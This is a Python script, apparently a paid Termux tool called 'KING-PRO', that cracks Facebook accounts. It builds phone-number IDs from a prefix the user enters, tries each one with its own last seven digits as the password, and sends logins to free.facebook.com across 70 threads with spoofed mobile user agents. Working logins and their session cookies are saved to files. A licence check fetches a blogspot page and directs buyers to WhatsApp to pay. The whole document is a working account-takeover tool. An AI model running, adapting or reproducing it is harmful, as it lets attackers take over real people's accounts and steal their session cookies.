#Create By No Name
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system(' pkg reinstall python -y')
os.system('clear')
print (' Loading Tools...')
try:os.mkdir('/sdcard/KING')
except:pass
time.sleep(1)
ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'


logo=("""\033[1;37m
 db   dD d888888b d8b   db  d888b  
 88 ,8P'   `88'   888o  88 88' Y8b 
 88,8P      88    88V8o 88 88      
 88`8b      88    88 V8o88 88  ooo  \033[1;31mP
 \033[1;37m88 `88.   .88.   88  V888 88. ~8~  \033[1;32mR
 \033[1;37mYP   YD Y888888P VP   V8P  Y888P \033[1;33m  O
\033[1;37m----------------------------------------------
\033[1;32m[✓] \033[1;37mAuthor    \033[1;32m> \033[1;37mZSKING777
\033[1;32m[✓] \033[1;37mTool Name \033[1;32m> \033[1;37mKING-PRO
\033[1;32m[✓] \033[1;37mType type \033[1;32m> \033[1;32m PAID
\033[1;37m----------------------------------------------\033[1;37m""")
loop = 0
oks = []
cps = []

    
proxy = ['[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/BAC-L22;FBSV/8.0.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957647;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/334763932;FBCR/MTS RUS;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1906;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]']
def line():
	print('----------------------------------------------')

def approval():

  os.system('clear')

  print(logo)

  uuid = str(os.geteuid()) + str(os.getlogin())

  id = "-".join(uuid)

  try:

    httpCaht = requests.get('https://zainking777.blogspot.com/2023/10/approvaltxt.html').text

    if id in httpCaht:

      print("\33[1;32mYour Token is Successfully Approved")

      msg = str(os.geteuid())

      time.sleep(0.5)

      random_crack()
      pass

    else:

      print("Your Token : "+id)

      print('\33[1;37m----------------------------------------------')

      print("\33[1;32mImportant Note")

      print("\33[1;37m----------------------------------------------")

      print("\33[1;37mFor 15 Days Approval Price 400  One Month Price")

      print('600 Easypaisa Ya Kaise Be Acc sy payment kar ka')

      print('Pay ki ss admin ko sent kara free wala door rahoo')

      print('\33[1;37m----------------------------------------------')

      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')

      input('IF U WANT TO BUY THEN PRESS ENTER ')

      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923354267208?text='+tks),approval()

      time.sleep(1)

      approval()

  except:

    sys.exit()




def random_crack():
    os.system('clear')
    print(logo)
    print('[\033[1;32m1\033[1;37m] Random UID Crack')
    print('[\033[1;32m2\033[1;37m] WhatsApp Group')
    print('[\033[1;32m3\033[1;37m] Exit Program')
    line()
    opt = input('[\033[1;32m✓\033[1;37m] Choose : ')
    if opt =='2':
        os.system(' xdg-open https://chat.whatsapp.com/EwRNlHx9bgJ0HL5fpVXP3K')
    elif opt =='1':
        random_number()
    elif opt =='3':
        main()
    else:
    	print('----------------------------------------------'),print('[\033[1;32m✓\033[1;37m] Invilide Option\033[0;97m')

def random_number():
    user=[]
    os.system('clear')
    print(logo)
    print('[\033[1;32m+\033[1;37m] \033[1;33mExample : 0300 : 0304 : 0318 : 0333 : 0344\033[0;97m')
    line()
    kode = input('[\033[1;32m✓\033[1;37m] Put Code : ')
    line()
    limit = int(input('[\033[1;32m+\033[1;37m] Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[\033[1;32m~\033[1;37m] Crack Accounts : \033[1;32m'+tl)
        print(46*'\033[1;37m-')
        for guru in user:
            uid = kode+guru
            pwx = [guru]
            yaari.submit(rcrack,uid,pwx,tl)
    line()
    print('[\033[1;32m✓\033[1;37m] Cloning Has Been Completed')
    line()
    print('[\033[1;32m✓\033[1;37m] OK/CP Saved In KING Folder')
    line()
    input ('[\033[1;32m✓\033[1;37m] Again Run This Tool Press Enter')
    random_crack()

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'free.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9,en;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="100", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
             'user-agent':pro}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;37m[\033[1;32mOK-KING\033[1;37m] \033[1;32m'+cid+' | '+ps+'\033[0;97m')
                open('/sdcard/KING/OK-KING.txt', 'a').write(uid+' | '+ps+'\n')
                open('/sdcard/KING/OK-KING-Cookie.txt', 'a').write(cid+' | '+ps+'|'+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('\033[1;37m[\033[1;32mOK-KING\033[1;37m] \033[1;32m'+cid+' | '+ps+'\033[0;97m')
                open('/sdcard/KING/CP-KING.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[\033[1;32mR-KING\033[1;37m] [\033[1;33m%s\033[1;37m/\033[1;36m%s\033[0m]  [\033[1;32mOK \033[1;37m:- \033[1;32m%s\033[1;37m]  \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

approval()